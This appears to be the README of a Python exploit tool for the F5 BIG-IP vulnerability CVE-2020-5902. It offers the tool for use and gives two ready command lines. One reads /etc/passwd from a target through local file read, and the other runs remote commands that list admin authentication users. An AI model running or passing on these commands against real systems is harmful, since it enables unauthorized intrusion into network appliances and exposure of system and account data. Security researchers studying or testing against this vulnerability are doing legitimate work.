# CVE-2020-5902
Python script to exploit F5 Big-IP CVE-2020-5902


## Examples
Exploit local file read:
`python3 CVE-2020-5902.py -t example.com -x lfr -f /etc/passwd`

Exploit RCE:
`python3 CVE-2020-5902.py -t example.com -x rce -a list+auth+user+admin`
